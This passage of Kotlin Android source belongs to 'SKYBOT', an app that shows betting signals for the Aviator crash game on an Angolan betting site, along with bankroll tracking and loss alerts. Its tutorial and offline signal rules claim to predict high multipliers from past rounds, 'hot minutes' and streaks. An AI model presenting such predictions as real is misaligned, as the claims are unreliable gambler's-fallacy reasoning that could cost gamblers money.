                txtJanela.animate().alpha(1f).setDuration(400).start()
            } else {
                txtJanela.visibility = View.GONE
            }

            dotView.background = circulo(cor)
            iniciarPulse(cor)
            barLayout.setBackgroundColor(Color.parseColor(when (cor) {
                "#22c55e" -> "#03100a"; "#f59e0b" -> "#0f0a00"
                "#7c3aed" -> "#0a0518"; "#f0abfc" -> "#10021e"
                "#ec4899" -> "#10020a"; "#3b82f6" -> "#020810"
                else -> "#0a0f1e"
            }))
        }
    }

    // ── Durante o voo: esconder txtAcao completamente, só o multiplicador no txtMinutos ──
private fun mostrarEmVoo(num: Double) {
    runOnUiThread {
        // ✅ CONGELAR COMPLETAMENTE DURANTE O VOO
        
        // 1 — Esconder tendência (txtAcao)
        txtAcao.visibility = View.GONE
        txtAcao.clearAnimation()
        txtAcao.animate().cancel()
        txtAcao.alpha = 1f
        
        // 2 — Congelar protecção
        if (::txtProtecao.isInitialized) {
            txtProtecao.clearAnimation()
            txtProtecao.animate().cancel()
            txtProtecao.alpha = 0.6f
        }
        
        // 3 — Congelar alcance
        if (::txtAlcance.isInitialized) {
            txtAlcance.clearAnimation()
            txtAlcance.animate().cancel()
            txtAlcance.alpha = 0.6f
        }
        
        // 4 — Congelar janela
        if (::txtJanela.isInitialized) {
            txtJanela.clearAnimation()
            txtJanela.animate().cancel()
        }
        
        // 5 — Mostrar multiplicador
        txtMinutos.text = "${String.format("%.2f", num)}x"
        txtMinutos.setTextColor(Color.parseColor("#f59e0b"))
        txtMinutos.textSize = 16f
        txtMinutos.typeface = Typeface.DEFAULT_BOLD
        txtMinutos.visibility = View.VISIBLE
        
        // 6 — Esconder relógio durante o voo
        txtRelogio.visibility = View.GONE
    }
}
    private fun iniciarPulse(cor: String) {
        pulseRunnable?.let { handler.removeCallbacks(it) }
        // Só o ponto (dotView) pisca — txtRelogio nunca é afectado
        val anim = AlphaAnimation(1f, 0.15f).apply {
            duration = 800; repeatMode = Animation.REVERSE; repeatCount = Animation.INFINITE
        }
        dotView.startAnimation(anim)
        // Parar ao fim de 60s para cobrir janelas de 1 minuto
        pulseRunnable = Runnable { dotView.clearAnimation() }
        handler.postDelayed(pulseRunnable!!, 60_000L)
    }

    private fun atualizarBarra(acao: String, minutos: String, protecao: String, alcance: String, cor: String) =
        runOnUiThread {
            pulseRunnable?.let { handler.removeCallbacks(it) }
            dotView.clearAnimation()
            // Restaurar visibilidade normal (pode ter sido escondido durante o voo)
            txtAcao.visibility = View.VISIBLE
            txtAcao.text = acao
            txtAcao.setTextColor(Color.parseColor(cor))
            // Estado/countdown em txtMinutos (não o relógio)
            txtMinutos.text = minutos
            txtMinutos.setTextColor(Color.parseColor("#64748b"))
            txtMinutos.textSize = 12f
            if (::txtJanela.isInitialized) txtJanela.visibility = View.GONE
            if (protecao.isNotEmpty()) {
                txtProtecao.text = "🛡 $protecao"
                txtProtecao.setTextColor(Color.parseColor("#64748b"))
            }
            if (alcance.isNotEmpty()) {
                txtAlcance.text = "🎯 $alcance"
                txtAlcance.setTextColor(Color.parseColor("#64748b"))
            }
            dotView.background = circulo(cor)
            barLayout.setBackgroundColor(Color.parseColor(when (cor) {
                "#22c55e" -> "#03100a"; "#f59e0b" -> "#0f0a00"
                "#7c3aed" -> "#0a0518"; "#ec4899" -> "#10020a"
                else -> "#0a0f1e"
            }))
        }

    // ── CONFIG ────────────────────────────────────────────────────
    private fun mostrarConfig() {
        val dialog = android.app.Dialog(this, android.R.style.Theme_Material_NoActionBar_Fullscreen)
        val scroll = ScrollView(this).apply { setBackgroundColor(Color.parseColor("#0a0a0f")) }
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(32), dp(20), dp(28))
        }

        // ── Cabeçalho ──
        layout.addView(TextView(this).apply {
            text = "SKYBOT  v$VERSAO_ATUAL"
            textSize = 16f; setTextColor(Color.WHITE); typeface = Typeface.DEFAULT_BOLD
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { bottomMargin = dp(6) }
        })

        // Resumo da banca
        if (bancaAtual > 0) {
            layout.addView(TextView(this).apply {
                val winRate = if (totalApostas > 0) "${totalGanhos * 100 / totalApostas}% win" else "--"
                val roi = if (bancaInicial > 0) {
                    val r = (bancaAtual - bancaInicial) / bancaInicial * 100
                    val sinal = if (r >= 0) "+" else ""; "$sinal${String.format("%.1f", r)}% ROI"
                } else ""
                text = "Banca: ${String.format("%.0f", bancaAtual)} AOA  ·  Aposta: ${String.format("%.0f", calcularAposta())} AOA/ronda\n" +
                       "Apostas: $totalApostas  ·  $winRate  ${if (roi.isNotEmpty()) "·  $roi" else ""}"
                textSize = 12f; setTextColor(Color.parseColor("#64748b"))
                layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { bottomMargin = dp(20) }
            })
        } else {
            layout.addView(TextView(this).apply {
                text = "Banca não definida"
                textSize = 12f; setTextColor(Color.parseColor("#475569"))
                layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { bottomMargin = dp(20) }
            })
        }

        // ── Grupo: Banca ──
        layout.addView(seccao("BANCA & SESSÃO"))
        layout.addView(btn("💰  Definir banca / Reset sessão", "#065f46") {
            dialog.dismiss(); mostrarDialogoBanca()
        })
        layout.addView(btn("📊  Estatísticas da sessão", "#1e3a5f") {
            dialog.dismiss()
            AlertDialog.Builder(this)
                .setTitle("Estatísticas")
                .setMessage(calcularEstatisticasSessao())
                .setPositiveButton("OK") { d, _ -> d.dismiss() }
                .show()
        })

        // ── Grupo: Jogo ──
        layout.addView(seccao("JOGO"))
        layout.addView(btn("✈️  Abrir Aviator", "#0f766e") {
            dialog.dismiss()
            webView.loadUrl("https://www.elephantbet.co.ao/pt/casino/game-view/806666/aviator")
        })
        layout.addView(btn("🤖  Pedir sinal à IA agora", "#7c3aed") {
            dialog.dismiss()
            analisandoIA = false
            if (historicoVelas.size >= 3) pedirSinalIA()
            else Toast.makeText(this, "Precisa de ${3 - historicoVelas.size} velas mais", Toast.LENGTH_LONG).show()
        })

        // ── Grupo: App ──
        layout.addView(seccao("APP"))
        layout.addView(btn("❓  Como usar o SKYBOT", "#0e7490") {
            dialog.dismiss(); mostrarTutorial()
        })
        layout.addView(btn("🔄  Verificar actualização", "#1d4ed8") {
            dialog.dismiss(); verificarAtualizacao()
        })
        layout.addView(btn("↺  Recarregar site", "#1e293b") {
            dialog.dismiss()
            webView.loadUrl("https://m.elephantbet.co.ao/pt/?action=login")
        })

        // ── Fechar ──
        layout.addView(View(this).apply {
            layoutParams = LinearLayout.LayoutParams(MATCH, dp(1)).apply { topMargin = dp(12); bottomMargin = dp(4) }
            setBackgroundColor(Color.parseColor("#1e293b"))
        })
        layout.addView(btn("✕  Fechar", "#0a0a0f") { dialog.dismiss() })

        scroll.addView(layout); dialog.setContentView(scroll); dialog.show()
    }

    private fun seccao(titulo: String) = TextView(this).apply {
        text = titulo; textSize = 10f; typeface = Typeface.DEFAULT_BOLD
        setTextColor(Color.parseColor("#334155")); letterSpacing = 0.12f
        layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply {
            topMargin = dp(18); bottomMargin = dp(4)
        }
    }

    // ── TUTORIAL ─────────────────────────────────────────────────
    private fun mostrarTutorial() {
        val slides = listOf(
            Triple("🛰️ BEM-VINDO AO SKYBOT", "#0e7490",
                "O SKYBOT é um assistente inteligente para o jogo Aviator.\n\n" +
                "Ele analisa as últimas velas em tempo real e usa Inteligência Artificial para prever quando é mais provável aparecer uma vela alta.\n\n" +
                "⚠️ Lembra: nenhum bot garante lucros. Joga sempre com responsabilidade e nunca apostas o que não podes perder."
            ),
            Triple("⏳ FASE DE RECOLHA — AGUARDA AS 15 VELAS", "#b45309",
                "Ao abrir o Aviator, o SKYBOT NÃO analisa imediatamente.\n\n" +
                "Primeiro precisa de observar 15 velas ao vivo para ter dados suficientes.\n\n" +
                "Durante essa fase verás na barra:\n" +
                "⏳ A RECOLHER DADOS — 8/15 velas capturadas\n\n" +
                "Não faças apostas nesta fase! Aguarda até a barra mudar para o primeiro sinal.\n\n" +
                "Após as 15 velas → IA analisa automaticamente → sinal aparece.\n" +
                "A partir daí, nova análise a cada 1-2 minutos."
            ),
            Triple("🛡️ PROTECÇÃO  vs  🎯 ALCANCE", "#0f766e",
                "A barra mostra dois valores:\n\n" +
                "🛡️ PROTECÇÃO — O ponto onde deves sair para não perder tudo. Sai SEMPRE aqui com 70% da tua aposta.\n" +
                "Exemplo: Prot=2x → sai quando chegar a 2x.\n\n" +
                "🎯 ALCANCE — O intervalo onde a vela provavelmente vai chegar. É o teu objectivo.\n" +
                "Exemplo: Alc=10x→30x → a vela deve ir entre 10x e 30x.\n\n" +
                "💡 Estratégia: coloca 70% da aposta na PROTECÇÃO e 30% no ALCANCE."
            ),
            Triple("⏱️ COMO APOSTAR COM O SINAL", "#1d4ed8",
                "Quando aparece um sinal:\n\n" +
                "1️⃣  Verifica a janela de minutos\n" +
                "   Ex: '⏱ Entrar: min 28 → 30'\n" +
                "   Só entras nesse intervalo!\n\n" +
                "2️⃣  Coloca a aposta dividida:\n" +
                "   • 70% com saída automática na PROTECÇÃO\n" +
                "   • 30% com saída automática no ALCANCE\n\n" +
                "3️⃣  Aguarda o resultado\n\n" +
                "⚠️ Nunca aumentes a aposta após perda (sem Martingale)!"
            ),
            Triple("🚫 QUANDO NÃO ENTRAR", "#dc2626",
                "O SKYBOT avisa quando NÃO deves jogar:\n\n" +
                "🔵🔵🔵 COMBOIO DE AZUIS — 3 ou mais seguidos → PARA! Mercado em queda.\n\n" +
                "📉 QUEDA — Tendência a descer → reduz aposta ou não entres.\n\n" +
                "⚡ Após uma vela MEGA (≥50x) → as próximas costumam ser azuis por 2-5 rondas.\n\n" +
                "🕐 Evita entrar no meio de um sinal antigo (>5 minutos) — pede um novo ao ⚙️ → PEDIR SINAL."
            ),
            Triple("💰 GESTÃO DE BANCA", "#065f46",
                "Define a tua banca em ⚙️ → DEFINIR BANCA.\n\n" +
                "O SKYBOT calcula automaticamente a aposta segura por ronda: 2% da banca.\n" +
                "Exemplo: Banca 5.000 AOA → aposta de 100 AOA por ronda.\n\n" +
                "Estratégia recomendada:\n" +
                "• 70% da aposta com saída na PROTECÇÃO\n" +
                "• 30% da aposta com saída no ALCANCE\n\n" +
                "🚫 NUNCA apostar mais de 5% da banca numa ronda.\n" +
                "🚫 NUNCA usar Martingale (dobrar após perda)."
            ),
            Triple("🛑 STOP-LOSS & TAKE-PROFIT", "#7c2d12",
                "O SKYBOT protege-te automaticamente:\n\n" +
                "🛑 STOP-LOSS: Se perderes 20% da banca inicial, o app avisa para parar.\n" +
                "Exemplo: Banca 5.000 AOA → para ao perder 1.000 AOA.\n\n" +
                "✅ TAKE-PROFIT: Se ganhares 30% da banca inicial, o app sugere parar e guardar.\n" +
                "Exemplo: Banca 5.000 AOA → parar ao ganhar 1.500 AOA.\n\n" +
                "⚠️ Alertas de comportamento:\n" +
                "• 3 perdas seguidas → aviso de tilt\n" +
                "• 90 minutos de jogo → aviso de cansaço\n" +
                "• Taxa de vitórias < 30% → mercado desfavorável"
            )
        )

        var slideActual = 0
        val dialog = android.app.Dialog(this, android.R.style.Theme_Material_NoActionBar_Fullscreen)
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#0a0a0f"))
            layoutParams = ViewGroup.LayoutParams(MATCH, MATCH)
        }

        // Indicadores de slide (bolinhas no topo)
        val indicadores = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            setPadding(0, dp(20), 0, dp(10))
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP)
        }
        val dotViews = slides.mapIndexed { i, _ ->
            View(this).apply {
                layoutParams = LinearLayout.LayoutParams(dp(8), dp(8)).apply { marginEnd = dp(6) }
                background = circulo(if (i == 0) "#0e7490" else "#334155")
            }
        }
        dotViews.forEach { indicadores.addView(it) }

        // Scroll com conteúdo
        val scroll = ScrollView(this).apply {
            layoutParams = LinearLayout.LayoutParams(MATCH, 0, 1f)
        }
        val content = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(24), dp(16), dp(24), dp(16))
        }

        val txtTitulo = TextView(this).apply {
            textSize = 19f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.WHITE); gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { bottomMargin = dp(20) }
        }
        val txtCorpo = TextView(this).apply {
            textSize = 15f; setTextColor(Color.parseColor("#cbd5e1"))
            lineHeight = (textSize * 1.6f).toInt()
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP)
        }
        content.addView(txtTitulo); content.addView(txtCorpo)
        scroll.addView(content)

        // Botões nav
        val navRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            setPadding(dp(16), dp(12), dp(16), dp(28))
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP)
        }
        val btnAnterior = btn("← Anterior", "#1e293b") {}
        val btnProximo  = btn("Próximo →", "#0e7490") {}
        btnAnterior.layoutParams = LinearLayout.LayoutParams(0, WRAP, 1f).apply { marginEnd = dp(10) }
        btnProximo.layoutParams  = LinearLayout.LayoutParams(0, WRAP, 1f)

        fun actualizarSlide() {
            val (titulo, cor, corpo) = slides[slideActual]
            txtTitulo.text = titulo
            txtTitulo.setTextColor(Color.parseColor(cor))
            txtCorpo.text = corpo
            dotViews.forEachIndexed { i, v -> v.background = circulo(if (i == slideActual) cor else "#334155") }
            btnAnterior.visibility = if (slideActual == 0) View.INVISIBLE else View.VISIBLE
            btnProximo.text = if (slideActual == slides.lastIndex) "✅ Começar!" else "Próximo →"
            btnProximo.background = roundRect(cor)
            scroll.smoothScrollTo(0, 0)
        }

        btnAnterior.setOnClickListener {
            if (slideActual > 0) { slideActual--; actualizarSlide() }
        }
        btnProximo.setOnClickListener {
            if (slideActual < slides.lastIndex) {
                slideActual++; actualizarSlide()
            } else {
                dialog.dismiss()
            }
        }

        navRow.addView(btnAnterior); navRow.addView(btnProximo)
        root.addView(indicadores); root.addView(scroll); root.addView(navRow)
        dialog.setContentView(root)
        actualizarSlide()
        dialog.show()
    }


    // ══════════════════════════════════════════════════════════════
    // GESTÃO DE BANCA & TRACKING
    // ══════════════════════════════════════════════════════════════

    private fun carregarPrefs() {
        val p = getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        bancaInicial  = p.getFloat("banca_inicial", 0f).toDouble()
        bancaAtual    = p.getFloat("banca_atual",   0f).toDouble()
        totalApostas  = p.getInt("total_apostas",   0)
        totalGanhos   = p.getInt("total_ganhos",    0)
        totalPerdas   = p.getInt("total_perdas",    0)
        lucroLiquido  = p.getFloat("lucro_liquido", 0f).toDouble()
        maxSequenciaPerdas = p.getInt("max_seq_perdas", 0)
        if (bancaAtual <= 0 && bancaInicial > 0) bancaAtual = bancaInicial
    }

    private fun guardarPrefs() {
        getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit().apply {
            putFloat("banca_inicial",  bancaInicial.toFloat())
            putFloat("banca_atual",    bancaAtual.toFloat())
            putInt("total_apostas",    totalApostas)
            putInt("total_ganhos",     totalGanhos)
            putInt("total_perdas",     totalPerdas)
            putFloat("lucro_liquido",  lucroLiquido.toFloat())
            putInt("max_seq_perdas",   maxSequenciaPerdas)
            apply()
        }
    }

    /** Regista o resultado de uma ronda apostada. Ganho = saiu acima da protecção. */
    private fun registarResultado(ganhou: Boolean, valorApostado: Double, multiplicadorSaida: Double) {
        totalApostas++
        val resultado = if (ganhou) valorApostado * multiplicadorSaida - valorApostado
                        else        -valorApostado
        lucroLiquido += resultado
        bancaAtual   += resultado
        if (ganhou) {
            totalGanhos++
            sequenciaPerdas = 0
        } else {
            totalPerdas++
            sequenciaPerdas++
            if (sequenciaPerdas > maxSequenciaPerdas) maxSequenciaPerdas = sequenciaPerdas
        }
        guardarPrefs()
        verificarStopLossTakeProfit()
        verificarAlertasComportamentais()
    }

    /** Calcula o tamanho de aposta seguro: 2% da banca actual. */
    private fun calcularAposta(): Double {
        if (bancaAtual <= 0) return 0.0
        return (bancaAtual * MAX_RISCO_PORCENTO / 100.0)
    }

    /** Verifica stop-loss (−20% banca inicial) e take-profit (+30%). */
    private fun verificarStopLossTakeProfit() {
        if (bancaInicial <= 0) return
        val perdaTotal = bancaInicial - bancaAtual
        val ganhoTotal = bancaAtual - bancaInicial
        if (!stopLossAtivo && perdaTotal >= bancaInicial * STOP_LOSS_PORCENTO / 100.0) {
            stopLossAtivo = true
            runOnUiThread {
                AlertDialog.Builder(this)
                    .setTitle("🛑 STOP-LOSS ACTIVADO")
                    .setMessage("Perdeste ${String.format("%.0f", perdaTotal)} AOA (${STOP_LOSS_PORCENTO.toInt()}% da banca inicial).\n\nO SKYBOT recomenda parar agora.\n\nContinuar a jogar agora é emocionalmente arriscado.")
                    .setPositiveButton("Parar e sair") { _, _ -> finish() }
                    .setNegativeButton("Ignorar (risco meu)") { d, _ -> d.dismiss() }
                    .show()
            }
        }
        if (!takeProfitAtivo && ganhoTotal >= bancaInicial * TAKE_PROFIT_PORCENTO / 100.0) {
            takeProfitAtivo = true
            runOnUiThread {
                AlertDialog.Builder(this)
                    .setTitle("✅ OBJECTIVO ATINGIDO!")
                    .setMessage("Ganhaste ${String.format("%.0f", ganhoTotal)} AOA (${TAKE_PROFIT_PORCENTO.toInt()}% da banca inicial).\n\nParar agora é a decisão mais inteligente.\nGuarda os ganhos e volta amanhã.")
                    .setPositiveButton("Guardar e sair") { _, _ -> finish() }
                    .setNegativeButton("Continuar") { d, _ -> d.dismiss() }
                    .show()
            }
        }
    }

    /** Alertas comportamentais: tilt, tempo de jogo, perdas consecutivas. */
    private fun verificarAlertasComportamentais() {
        val minsSessao = (System.currentTimeMillis() - timestampInicioSessao) / 60000
        runOnUiThread {
            when {
                // 3 perdas seguidas → pausa forçada
                sequenciaPerdas >= 3 && sequenciaPerdas % 3 == 0 ->
                    mostrarAlertaComportamental(
                        "⚠️ ${sequenciaPerdas} PERDAS SEGUIDAS",
                        "Isto pode ser tilt (jogar por emoção, não por estratégia).\n\nFaz uma pausa de 10 minutos antes de continuar.\n\nNão aumentes a aposta para recuperar perdas.",
                        urgente = sequenciaPerdas >= 6
                    )
                // Mais de 90 minutos de sessão
                minsSessao >= 90 && minsSessao % 30 == 0L ->
                    mostrarAlertaComportamental(
                        "🕐 ${minsSessao} MINUTOS DE JOGO",
                        "Já jogas há ${minsSessao} minutos.\n\nA atenção diminui com o tempo — isto aumenta os erros.\n\nConsidera fazer uma pausa ou terminar a sessão.",
                        urgente = minsSessao >= 120
                    )
                // Taxa de vitórias muito baixa
                totalApostas >= 10 && (totalGanhos.toDouble() / totalApostas) < 0.3 ->
                    mostrarAlertaComportamental(
                        "📉 TAXA DE VITÓRIAS BAIXA",
                        "Ganhaste apenas ${totalGanhos}/${totalApostas} rondas (${(totalGanhos*100/totalApostas)}%).\n\nO mercado pode estar desfavorável agora.\n\nConsidera pausar e voltar mais tarde.",
                        urgente = false
                    )
            }
        }
    }

    private fun mostrarAlertaComportamental(titulo: String, msg: String, urgente: Boolean) {
        AlertDialog.Builder(this)
            .setTitle(titulo)
            .setMessage(msg)
            .setPositiveButton(if (urgente) "Parar agora" else "Fazer pausa") { d, _ -> d.dismiss() }
            .setNegativeButton("Continuar") { d, _ -> d.dismiss() }
            .show()
    }

    /** Estatísticas reais da sessão — distribuição percentil das velas capturadas. */
    private fun calcularEstatisticasSessao(): String {
        val n = historicoVelas.size
        if (n < 5) return "Dados insuficientes (${n}/5 mínimo)"
        val sorted = historicoVelas.sorted()
        val p25  = sorted[(n * 0.25).toInt()]
        val p50  = sorted[(n * 0.50).toInt()]
        val p75  = sorted[(n * 0.75).toInt()]
        val p90  = sorted[(n * 0.90).toInt().coerceAtMost(n-1)]
        val abaixo2x = historicoVelas.count { it < 2.0 } * 100 / n
        val acima10x = historicoVelas.count { it >= 10.0 } * 100 / n
        val acima50x = historicoVelas.count { it >= 50.0 } * 100 / n
        val winRate  = if (totalApostas > 0) totalGanhos * 100 / totalApostas else 0
        val roi      = if (bancaInicial > 0) ((bancaAtual - bancaInicial) / bancaInicial * 100) else 0.0
        return buildString {
            appendLine("📊 ESTATÍSTICAS DA SESSÃO")
            appendLine("────────────────────────")
            appendLine("Velas capturadas: $n")
            appendLine("P25: ${String.format("%.2f",p25)}x  P50: ${String.format("%.2f",p50)}x")
            appendLine("P75: ${String.format("%.2f",p75)}x  P90: ${String.format("%.2f",p90)}x")
            appendLine("Abaixo 2x: $abaixo2x%  |  Acima 10x: $acima10x%  |  Acima 50x: $acima50x%")
            appendLine("")
            appendLine("🎯 DESEMPENHO")
            appendLine("Apostas: $totalApostas  |  Ganhos: $totalGanhos  |  Perdas: $totalPerdas")
            appendLine("Taxa vitórias: $winRate%")
            appendLine("Lucro/Perda: ${if (lucroLiquido >= 0) "+" else ""}${String.format("%.0f",lucroLiquido)} AOA")
            if (bancaInicial > 0) appendLine("ROI: ${if (roi >= 0) "+" else ""}${String.format("%.1f",roi)}%")
            appendLine("Pior sequência perdas: $maxSequenciaPerdas")
            if (bancaAtual > 0) appendLine("\nAposta sugerida: ${String.format("%.0f", calcularAposta())} AOA (2% da banca)")
        }
    }

    /** Dialog para definir a banca inicial. */
    private fun mostrarDialogoBanca() {
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(20), dp(20), dp(10))
        }
        val txtInfo = TextView(this).apply {
            text = if (bancaInicial > 0)
                "Banca actual: ${String.format("%.0f", bancaAtual)} AOA\nBanca inicial: ${String.format("%.0f", bancaInicial)} AOA"
            else "Define a tua banca de jogo para activar a gestão de risco."
            textSize = 13f; setTextColor(Color.parseColor("#94a3b8"))
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { bottomMargin = dp(12) }
        }
        val editBanca = EditText(this).apply {
            hint = "Banca em AOA (ex: 5000)"; textSize = 16f
            inputType = android.text.InputType.TYPE_CLASS_NUMBER or android.text.InputType.TYPE_NUMBER_FLAG_DECIMAL
            setTextColor(Color.WHITE); setHintTextColor(Color.parseColor("#475569"))
            if (bancaAtual > 0) setText(String.format("%.0f", bancaAtual))
        }
        layout.addView(txtInfo); layout.addView(editBanca)
        AlertDialog.Builder(this)
            .setTitle("💰 DEFINIR BANCA")
            .setView(layout)
            .setPositiveButton("Confirmar") { _, _ ->
                val valor = editBanca.text.toString().toDoubleOrNull()
                if (valor != null && valor > 0) {
                    if (bancaInicial <= 0) bancaInicial = valor
                    bancaAtual = valor
                    stopLossAtivo = false; takeProfitAtivo = false
                    sequenciaPerdas = 0; totalApostas = 0; totalGanhos = 0
                    totalPerdas = 0; lucroLiquido = 0.0
                    guardarPrefs()
                    Toast.makeText(this, "Banca definida: ${String.format("%.0f",valor)} AOA\nAposta sugerida: ${String.format("%.0f",calcularAposta())} AOA por ronda", Toast.LENGTH_LONG).show()
                } else {
                    Toast.makeText(this, "Valor inválido", Toast.LENGTH_SHORT).show()
                }
            }
            .setNegativeButton("Cancelar") { d, _ -> d.dismiss() }
            .show()
    }

    private fun circulo(cor: String) = GradientDrawable().apply { shape = GradientDrawable.OVAL; setColor(Color.parseColor(cor)) }
    private fun pill(cor: String) = GradientDrawable().apply { shape = GradientDrawable.RECTANGLE; cornerRadius = dp(20).toFloat(); setColor(Color.parseColor(cor)) }
    private fun roundRect(bg: String) = GradientDrawable().apply { shape = GradientDrawable.RECTANGLE; cornerRadius = dp(10).toFloat(); setColor(Color.parseColor(bg)) }
    private fun dp(v: Int) = (v * resources.displayMetrics.density).toInt()
    private fun btn(txt: String, cor: String, action: () -> Unit) = Button(this).apply {
        text = txt; setTextColor(Color.WHITE); textSize = 13f; typeface = Typeface.DEFAULT_BOLD
        isAllCaps = false; background = roundRect(cor); setPadding(0, dp(14), 0, dp(14))
        setOnClickListener { action() }
        layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(8) }
    }

    // ══════════════════════════════════════════════════════════════
    // MELHORIA 1 — MODO SILENCIOSO
    // (controlado pelas flags modoSilenciosoAtivo no registarCrash e velaCapturada)

    // ══════════════════════════════════════════════════════════════
    // MELHORIA 2 — PADRÃO DE MINUTOS
    private fun minutosQuentesTexto(): String {
        val top = contagemMinutos.mapIndexed { i, c -> i to c }
            .filter { it.second >= 2 }.sortedByDescending { it.second }.take(3)
        return if (top.isEmpty()) "" else "⏱ Min. quentes: " + top.joinToString(", ") { ":%02d(${it.second}x)".format(it.first) }
    }

    // ══════════════════════════════════════════════════════════════
    // MELHORIA 3 — CACHE DA IA
    private fun invalidarCache() {
        cacheResultadoIA = null
        cacheNumVelas = 0
        cacheTimestampMs = 0L
    }

    // ══════════════════════════════════════════════════════════════
    // MELHORIA 4 — SOM + VIBRAÇÃO
    private fun inicializarSom() {
        val attrs = AudioAttributes.Builder()
            .setUsage(AudioAttributes.USAGE_NOTIFICATION)
            .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
            .build()
        soundPool = SoundPool.Builder().setMaxStreams(2).setAudioAttributes(attrs).build()
        soundPool?.setOnLoadCompleteListener { _, _, status -> soundCarregado = (status == 0) }
        // Tentar carregar som (adicionar res/raw/signal_alert.ogg ao projeto)
        try {
            val rid = resources.getIdentifier("signal_alert", "raw", packageName)
            if (rid != 0) soundIdSinal = soundPool?.load(this, rid, 1) ?: 0
        } catch (_: Exception) {}
    }

    private fun dispararAlertaSinal() {
        // Som
        if (soundCarregado && soundIdSinal != 0) {
            soundPool?.play(soundIdSinal, 1f, 1f, 1, 0, 1f)
        }
        // Vibração: padrão curto-longo-curto
        val padrao = longArrayOf(0, 80, 60, 200, 60, 80)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val vm = getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager
                vm.defaultVibrator.vibrate(VibrationEffect.createWaveform(padrao, -1))
            } else {
                @Suppress("DEPRECATION")
                val vib = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    vib.vibrate(VibrationEffect.createWaveform(padrao, -1))
                } else {
                    @Suppress("DEPRECATION")
                    vib.vibrate(padrao, -1)
                }
            }
        } catch (_: Exception) {}
    }

    // ══════════════════════════════════════════════════════════════
    // MELHORIA 5 — MODO CONSERVADOR AUTOMÁTICO
    private fun avaliarModoConservador() {
        val janela = historicoVelas.takeLast(JANELA_CONSERVADOR)
        if (janela.size < JANELA_CONSERVADOR) return
        val azuis = janela.count { it < 2.0 }
        val pctAzuis = azuis.toFloat() / JANELA_CONSERVADOR
        val eraConservador = modoConservadorAtivo
        modoConservadorAtivo = pctAzuis >= LIMIAR_AZUIS_CONSERVADOR

        if (modoConservadorAtivo != eraConservador) {
            // Mudança de estado → invalidar cache para forçar nova análise
            invalidarCache()
            runOnUiThread {
                if (modoConservadorAtivo && ::txtAviso.isInitialized) {
                    // Mostrar aviso conservador no banner
                    txtAviso.text = "⚠️ MERCADO INSTÁVEL (${(pctAzuis*100).toInt()}% azuis) — apostar pouco ou não entrar"
                    txtAviso.setTextColor(Color.parseColor("#fde68a"))
                    txtAviso.background = GradientDrawable().apply {
                        shape = GradientDrawable.RECTANGLE
                        cornerRadius = dp(6).toFloat()
                        setColor(Color.parseColor("#1c1208"))
                        setStroke(dp(1), Color.parseColor("#78350f"))
                    }
                    txtAviso.visibility = View.VISIBLE
                }
            }
            // Persistir estado conservador (M9)
            getSharedPreferences(PREFS_ESTADO, Context.MODE_PRIVATE)
                .edit().putBoolean(PREFS_CONSERVADOR, modoConservadorAtivo).apply()
        }
    }

    // ══════════════════════════════════════════════════════════════
    // MELHORIA 6 — HISTÓRICO DE SINAIS
    private fun actualizarEstatisticasSinais() {
        val comResultado = historicoSinais.filter { it.crashReal != null }
        if (comResultado.isEmpty()) return
        val total = comResultado.size
        val protOk = comResultado.count { it.protecaoOk == true }
        val alcOk = comResultado.count { it.alcanceOk == true }
        // Linha de últimos resultados (emojis)
        val emojis = historicoSinais.takeLast(5).joinToString(" ") { it.emoji }
        // Mostrar resumo compacto no txtMinutos quando não está em voo
        if (!emVoo && !sinaisAtivos) {
            val resumo = "Sinais: $emojis · Prot:${protOk*100/total}% Alc:${alcOk*100/total}%"
            txtMinutos.text = resumo
            txtMinutos.setTextColor(Color.parseColor("#64748b"))
        }
    }

    // ══════════════════════════════════════════════════════════════
    // MELHORIA 8 — SINAL OFFLINE
    private fun gerarSinalOffline(): Triple<Double, Int, Int> {
        val history = historicoVelas.takeLast(10)
        if (history.isEmpty()) return Triple(1.5, 2, 5)

        val seqAzuis = history.reversed().takeWhile { it < 2.0 }.size
        val temMega = history.takeLast(3).any { it >= 200.0 }
        val comboio4 = history.takeLast(4).size == 4 && history.takeLast(4).all { it < 2.0 }

        // Regras locais por prioridade
        return when {
            temMega -> Triple(3.0, 50, 70)               // pós-mega
            seqAzuis >= 5 -> Triple(1.1, 1, 2)           // comboio crítico
            seqAzuis >= 3 -> Triple(1.2, 2, 4)           // comboio moderado
            comboio4 -> Triple(2.0, 5, 15)               // 4 azuis → provável alta
            modoConservadorAtivo -> Triple(1.5, 3, 6)     // conservador
            else -> {                                      // baseado na média
                val avg = history.average()
                val prot = (avg * 0.2).coerceIn(1.3, 3.0)
                val alcMin = (avg * 0.5).toInt().coerceAtLeast(3)
                val alcMax = (avg * 1.2).toInt().coerceAtLeast(alcMin + 3)
                Triple(prot, alcMin, alcMax)
            }
        }
    }

    private fun emitirSinalOffline(sinal: Triple<Double, Int, Int>) {
        val (prot, alcMin, alcMax) = sinal
